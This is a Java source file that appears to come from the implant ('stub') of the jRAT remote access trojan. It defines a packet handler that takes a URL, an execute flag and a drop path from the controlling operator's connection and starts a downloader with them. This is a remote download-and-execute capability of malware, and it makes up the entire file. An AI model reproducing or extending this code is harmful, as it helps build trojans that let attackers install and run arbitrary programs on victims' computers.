package se.jrat.stub.packets.incoming;

import se.jrat.stub.AdvancedDownloader;
import se.jrat.stub.Connection;

public class Packet34AdvancedDownload extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = Connection.instance.readLine();
		boolean exec = Connection.instance.readBoolean();
		String drop = Connection.instance.readLine().toLowerCase();
		new AdvancedDownloader(url, exec, drop).start();
	}

}
